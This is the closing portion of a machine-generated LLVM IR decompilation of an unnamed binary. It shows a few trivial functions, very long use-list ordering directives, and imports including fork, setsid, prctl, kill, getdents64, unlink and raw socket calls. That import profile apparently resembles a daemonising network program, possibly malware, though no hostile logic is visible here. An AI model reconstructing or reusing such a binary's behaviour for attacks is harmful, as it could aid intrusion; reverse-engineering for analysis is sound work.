  uselistorder label %dec_label_pc_156c0, { 1, 0 }
}

define i32 @function_156cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_156cc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_156d0 = load i32, i32* @global_var_1e21c.636, align 4
  %v7_156d4 = icmp eq i32 %v3_156d0, -1
  %v3_156d8 = load i32, i32* @r4, align 4
  store i32 %v3_156d8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_1e21c.636 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_156d4, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_156cc
  store i32 %v3_156d8, i32* %r4.global-to-local, align 4
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_156cc, %.preheader
  %v0_156e8 = phi i32 [ %v3_156ec, %.preheader ], [ %v3_156d0, %dec_label_pc_156cc ]
  call void @__pseudo_branch(i32 %v0_156e8)
  %v0_156ec = load i32, i32* %r4.global-to-local, align 4
  %v1_156ec = add i32 %v0_156ec, -4
  %v2_156ec = inttoptr i32 %v1_156ec to i32*
  %v3_156ec = load i32, i32* %v2_156ec, align 4
  store i32 %v1_156ec, i32* %r4.global-to-local, align 4
  %v3_156f0 = icmp eq i32 %v3_156ec, -1
  br i1 %v3_156f0, label %dec_label_pc_156f8, label %.preheader

dec_label_pc_156f8:                               ; preds = %.preheader
  %v2_156f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_156f8, i32* %r4.global-to-local, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v3_156ec, { 1, 0 }
  uselistorder i32 %v3_156d0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 56, 16, 57, 58, 59, 3, 17, 18, 19, 60, 61, 62, 4, 20, 21, 22, 63, 64, 65, 5, 23, 24, 66, 15, 14, 67, 68, 69, 13, 12, 11, 10, 25, 26, 27, 28, 29, 0, 30, 1, 31, 2, 70, 9, 32, 44, 45, 51, 46, 33, 34, 47, 48, 49, 50, 52, 8, 7, 41, 42, 43, 6, 35, 36, 37, 53, 38, 39, 54, 55, 40 }
  uselistorder i32 -1, { 168, 0, 94, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 169, 95, 298, 96, 308, 97, 309, 288, 98, 347, 99, 348, 100, 349, 101, 350, 145, 92, 289, 290, 102, 291, 292, 103, 351, 1, 170, 2, 104, 310, 311, 171, 172, 284, 285, 146, 173, 147, 174, 3, 4, 91, 78, 79, 175, 176, 177, 90, 272, 178, 273, 5, 6, 105, 312, 106, 313, 107, 299, 108, 314, 109, 300, 110, 315, 111, 286, 112, 316, 113, 301, 114, 317, 115, 297, 116, 274, 117, 167, 118, 179, 119, 275, 120, 287, 121, 318, 122, 354, 355, 123, 276, 124, 319, 125, 293, 126, 294, 127, 277, 128, 356, 129, 352, 130, 278, 131, 306, 132, 353, 133, 307, 134, 320, 135, 279, 136, 357, 93, 358, 180, 181, 182, 183, 184, 185, 186, 187, 7, 8, 9, 10, 11, 137, 138, 12, 188, 189, 17, 190, 18, 302, 267, 148, 303, 13, 191, 16, 192, 86, 19, 193, 269, 270, 149, 268, 20, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 271, 14, 209, 15, 210, 211, 21, 212, 139, 304, 213, 22, 305, 87, 23, 24, 295, 214, 296, 152, 280, 25, 150, 281, 26, 27, 151, 282, 28, 29, 153, 283, 30, 31, 32, 33, 34, 215, 80, 81, 82, 83, 84, 85, 35, 36, 37, 216, 217, 218, 219, 38, 141, 142, 143, 144, 39, 40, 41, 220, 42, 43, 44, 45, 46, 88, 47, 48, 49, 50, 51, 52, 53, 221, 54, 140, 55, 56, 57, 222, 58, 59, 60, 61, 223, 62, 63, 64, 224, 65, 66, 67, 68, 69, 70, 71, 225, 72, 73, 74, 226, 75, 76, 227, 228, 229, 230, 77, 89, 321, 322, 159, 323, 157, 324, 158, 325, 155, 326, 231, 232, 233, 234, 235, 160, 327, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 154, 328, 161, 329, 262, 263, 264, 162, 265, 266, 156, 330, 163, 331, 164, 165, 166 }
  uselistorder i32* @global_var_1e21c.636, { 1, 0 }
  uselistorder i32 1, {}
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_15700() local_unnamed_addr {
dec_label_pc_15700:
  %v5_15704 = load i32, i32* @r0, align 4
  ret i32 %v5_15704

; uselistorder directives
  uselistorder i32* @r0, { 3, 90, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 53, 54, 56, 55, 23, 197, 198, 29, 30, 31, 32, 15, 2, 12, 13, 113, 114, 24, 199, 200, 43, 202, 18, 11, 116, 16, 115, 92, 28, 93, 17, 106, 117, 201, 37, 19, 57, 58, 59, 60, 26, 7, 61, 62, 63, 64, 6, 203, 10, 9, 118, 20, 119, 14, 120, 121, 8, 122, 123, 124, 125, 0, 33, 94, 95, 34, 35, 36, 96, 98, 99, 100, 101, 102, 105, 97, 78, 38, 39, 40, 41, 42, 44, 45, 46, 47, 48, 49, 25, 50, 51, 52, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 27, 77, 103, 104, 1, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 107, 108, 109, 110, 111, 126, 112, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 5, 4, 21, 22 }
}

define i32 @function_15708() local_unnamed_addr {
entry:
  %v3_1570c = load i32, i32* @r4, align 4
  %v0_15714 = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_1570c)
  ret i32 %v0_15714

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 8, 13, 14, 10, 11, 12, 15, 5, 6, 7, 2, 3, 4, 1, 9 }
  uselistorder i32 0, { 133, 0, 918, 919, 920, 921, 135, 134, 922, 1381, 1382, 1383, 1384, 1385, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1386, 1387, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 36, 1406, 1407, 1408, 1409, 1410, 37, 1411, 1412, 1413, 38, 1414, 1415, 1416, 39, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1432, 1433, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 40, 1452, 1453, 1454, 1455, 1456, 41, 1457, 1458, 1459, 1460, 1461, 42, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 736, 737, 315, 738, 316, 926, 1011, 1012, 1013, 1014, 1015, 739, 740, 1475, 1476, 1477, 1478, 317, 741, 1, 742, 743, 744, 1479, 1480, 1481, 136, 1482, 91, 1483, 89, 90, 1484, 1485, 1486, 318, 1490, 319, 1503, 1505, 615, 248, 1506, 320, 1504, 321, 322, 2, 1487, 1488, 137, 1016, 272, 1017, 325, 274, 273, 1018, 1019, 1020, 1021, 324, 1023, 1024, 323, 1025, 1489, 714, 715, 716, 717, 718, 719, 139, 107, 720, 92, 138, 140, 327, 1491, 328, 275, 1492, 1495, 1497, 1498, 326, 1028, 1030, 1031, 72, 249, 1032, 1029, 1026, 1027, 3, 927, 930, 928, 929, 250, 4, 1035, 1033, 1034, 251, 141, 931, 932, 933, 934, 987, 988, 329, 5, 989, 6, 1042, 1043, 142, 1036, 1037, 1038, 1039, 1040, 1041, 7, 8, 1022, 686, 687, 688, 330, 9, 331, 1044, 1045, 610, 935, 611, 1046, 936, 1047, 721, 1048, 937, 1049, 832, 689, 923, 1507, 1508, 84, 745, 332, 746, 747, 748, 749, 333, 750, 751, 752, 753, 754, 755, 756, 690, 722, 1050, 1496, 691, 1051, 757, 775, 692, 612, 1499, 95, 1500, 1493, 693, 1003, 1494, 1004, 1052, 694, 1501, 1502, 10, 1053, 108, 1054, 1055, 243, 242, 616, 96, 97, 98, 99, 638, 617, 74, 73, 109, 1056, 1057, 1058, 1059, 1061, 1060, 11, 1062, 1063, 245, 244, 618, 100, 101, 102, 103, 639, 619, 76, 75, 71, 81, 1064, 640, 1065, 1066, 1067, 104, 1068, 1069, 1070, 1071, 1072, 143, 620, 641, 621, 622, 1073, 642, 116, 144, 1074, 1075, 105, 1076, 1077, 12, 643, 252, 14, 13, 145, 1078, 146, 644, 15, 253, 147, 148, 306, 77, 149, 334, 938, 93, 758, 759, 1080, 1079, 1081, 1082, 43, 150, 1083, 153, 152, 151, 307, 308, 309, 155, 154, 156, 335, 1084, 1085, 157, 990, 991, 117, 158, 1086, 159, 661, 160, 1087, 1088, 161, 1089, 1090, 162, 163, 265, 939, 662, 663, 664, 682, 683, 665, 666, 667, 342, 668, 669, 341, 670, 671, 340, 672, 673, 337, 674, 675, 339, 676, 677, 338, 678, 685, 336, 679, 684, 680, 88, 78, 246, 247, 681, 940, 343, 941, 255, 264, 269, 266, 268, 942, 344, 943, 945, 165, 254, 944, 345, 346, 946, 947, 276, 948, 949, 645, 85, 347, 951, 952, 953, 954, 955, 956, 164, 348, 957, 958, 959, 960, 961, 962, 349, 963, 350, 964, 967, 968, 969, 166, 965, 167, 966, 16, 168, 950, 776, 777, 780, 781, 778, 779, 782, 783, 695, 352, 697, 169, 698, 699, 700, 701, 702, 703, 704, 705, 171, 170, 706, 86, 353, 707, 696, 356, 357, 17, 708, 709, 172, 710, 69, 70, 358, 359, 354, 351, 355, 711, 712, 713, 360, 310, 176, 175, 646, 311, 178, 177, 647, 312, 180, 179, 648, 313, 182, 181, 649, 650, 314, 174, 173, 257, 267, 258, 259, 260, 361, 723, 183, 184, 732, 724, 725, 726, 727, 728, 729, 730, 731, 256, 733, 734, 79, 735, 185, 186, 362, 94, 760, 761, 762, 763, 263, 764, 765, 766, 262, 767, 768, 769, 770, 112, 771, 773, 772, 110, 111, 187, 261, 364, 365, 363, 774, 279, 277, 278, 113, 188, 82, 189, 784, 121, 120, 118, 119, 785, 786, 83, 787, 788, 789, 790, 791, 190, 792, 793, 366, 794, 795, 796, 797, 194, 191, 192, 193, 798, 799, 800, 801, 367, 802, 803, 282, 804, 281, 805, 280, 806, 368, 807, 808, 809, 124, 122, 123, 18, 810, 811, 812, 813, 195, 814, 815, 284, 283, 816, 369, 817, 818, 819, 820, 821, 128, 125, 126, 127, 19, 822, 823, 824, 196, 825, 197, 826, 827, 287, 828, 286, 829, 285, 830, 370, 831, 202, 372, 200, 201, 198, 199, 833, 204, 203, 834, 205, 371, 836, 837, 132, 129, 130, 131, 20, 835, 838, 839, 840, 841, 842, 843, 21, 22, 23, 24, 25, 844, 845, 373, 289, 846, 374, 847, 375, 848, 376, 849, 377, 850, 378, 851, 379, 852, 288, 853, 206, 207, 208, 855, 856, 854, 858, 859, 857, 26, 27, 28, 29, 30, 860, 209, 861, 862, 291, 863, 380, 864, 381, 865, 382, 866, 383, 867, 384, 868, 385, 869, 290, 870, 386, 871, 211, 210, 212, 873, 874, 872, 875, 876, 80, 878, 879, 880, 881, 387, 882, 31, 32, 33, 34, 35, 877, 213, 114, 883, 884, 296, 885, 295, 886, 294, 887, 292, 888, 293, 889, 388, 890, 389, 891, 214, 217, 216, 215, 894, 895, 893, 892, 390, 897, 896, 898, 218, 899, 900, 299, 901, 298, 902, 297, 903, 391, 904, 219, 222, 221, 220, 907, 908, 906, 905, 910, 909, 911, 912, 223, 302, 913, 301, 914, 300, 915, 392, 916, 270, 917, 1091, 224, 1092, 924, 225, 925, 970, 971, 972, 973, 974, 975, 226, 976, 977, 978, 979, 980, 981, 982, 983, 227, 228, 984, 985, 986, 992, 229, 993, 994, 995, 230, 393, 996, 997, 44, 998, 999, 1000, 1001, 1002, 394, 1005, 231, 1093, 1006, 1007, 1008, 1009, 1094, 1095, 1010, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 395, 1109, 623, 624, 625, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 45, 1151, 1152, 1153, 232, 233, 1154, 396, 1155, 1156, 1157, 1158, 626, 651, 1159, 1160, 1161, 46, 1162, 1163, 1164, 1165, 47, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 48, 1173, 1174, 238, 1175, 1176, 1177, 1178, 1179, 1180, 49, 1181, 1182, 1183, 50, 1184, 1185, 1186, 51, 1187, 1188, 1189, 1190, 399, 1204, 1205, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 627, 652, 1200, 1201, 1202, 1203, 628, 653, 1206, 1207, 1208, 52, 1209, 1210, 400, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 629, 654, 1219, 1220, 1221, 53, 1222, 1223, 1224, 1225, 54, 1226, 630, 1227, 1228, 1231, 1232, 631, 234, 1229, 1230, 235, 236, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 632, 655, 1244, 1245, 1246, 55, 1247, 1248, 1249, 1250, 1251, 1252, 56, 1253, 115, 1254, 1255, 1256, 1257, 633, 656, 1258, 1259, 1260, 57, 1261, 237, 1262, 1263, 1264, 58, 1265, 1266, 1267, 1268, 1269, 634, 657, 1270, 1271, 1272, 59, 1273, 1274, 1275, 60, 397, 398, 1276, 1277, 1278, 1279, 1280, 635, 658, 1281, 1282, 1283, 61, 1284, 1285, 1286, 62, 1287, 1288, 1289, 63, 1290, 1291, 1292, 64, 1293, 1294, 1295, 1296, 65, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1309, 1310, 636, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 271, 1322, 1325, 1326, 1329, 1330, 1331, 66, 1327, 1328, 1323, 1324, 1332, 1333, 240, 239, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 67, 241, 1344, 1345, 1346, 68, 1347, 1348, 1349, 1350, 1352, 87, 401, 1353, 1351, 1307, 1308, 106, 613, 614, 1354, 1355, 1356, 637, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 303, 1377, 304, 1378, 305, 1379, 1380, 659, 660, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523 }
  uselistorder i32* @r4, { 41, 718, 474, 475, 476, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 146, 480, 574, 575, 576, 736, 737, 738, 739, 740, 741, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 742, 743, 3, 744, 745, 746, 747, 769, 770, 771, 772, 39, 773, 31, 764, 765, 766, 767, 768, 748, 749, 750, 577, 578, 579, 580, 581, 582, 583, 584, 751, 752, 115, 116, 763, 585, 586, 587, 481, 4, 482, 483, 484, 5, 485, 6, 486, 487, 551, 7, 8, 552, 553, 554, 555, 556, 557, 588, 9, 596, 597, 589, 590, 591, 592, 593, 594, 595, 66, 67, 68, 69, 70, 71, 755, 756, 759, 760, 598, 599, 600, 601, 602, 603, 488, 489, 604, 605, 117, 118, 606, 607, 490, 491, 608, 609, 283, 284, 72, 73, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 74, 75, 119, 120, 610, 611, 761, 762, 2, 76, 77, 612, 613, 183, 184, 209, 210, 78, 79, 753, 754, 568, 569, 757, 758, 570, 571, 614, 615, 80, 81, 616, 617, 492, 493, 494, 495, 185, 186, 187, 188, 189, 618, 619, 620, 42, 621, 622, 623, 624, 625, 626, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 496, 497, 54, 56, 57, 55, 58, 59, 60, 61, 62, 63, 64, 65, 498, 499, 500, 501, 502, 503, 504, 505, 506, 512, 513, 514, 515, 522, 523, 524, 525, 526, 527, 533, 0, 534, 516, 517, 518, 519, 520, 521, 507, 508, 509, 510, 511, 437, 438, 439, 440, 211, 212, 213, 214, 528, 529, 530, 531, 532, 82, 83, 84, 85, 86, 87, 88, 89, 10, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 11, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 32, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 190, 191, 192, 1, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 12, 267, 13, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 14, 301, 15, 302, 16, 303, 17, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 18, 328, 19, 329, 20, 330, 21, 331, 332, 333, 334, 335, 22, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 23, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 24, 418, 25, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 441, 26, 442, 27, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 627, 628, 629, 477, 478, 479, 535, 536, 537, 538, 539, 540, 28, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 558, 561, 559, 560, 562, 563, 564, 565, 566, 567, 572, 573, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 33, 661, 662, 38, 663, 30, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 37, 29, 676, 677, 678, 679, 680, 681, 682, 36, 683, 684, 685, 35, 686, 687, 688, 34, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 40, 719 }
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
